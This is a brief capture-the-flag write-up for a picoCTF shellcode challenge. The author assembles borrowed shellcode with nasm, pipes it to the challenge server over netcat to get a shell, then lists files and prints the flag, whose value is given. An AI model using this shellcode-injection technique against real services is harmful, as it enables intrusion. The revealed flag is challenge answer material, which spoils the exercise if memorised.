This was pretty easy as there are many shellcodes available in the internet. I don't remember where did I get this one, but it was probably taken from [this site](https://www.exploit-db.com/shellcode/).
We can input 40 bytes and most of shellcodes are even shorter so it's not big problem to find one working. We will copy assembly source code and compile it to binary using nasm.
Now we can connect to the server and send it our shellcode.
```
$ nasm payload.asm
$ cat payload - | nc shell2017.picoctf.com 49324
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
ls
flag.txt
shellz
shellz_no_aslr
xinetd_wrapper.sh
cat flag.txt
51e2978e4e59013145c2613f01185802
```

The flag is `51e2978e4e59013145c2613f01185802`.
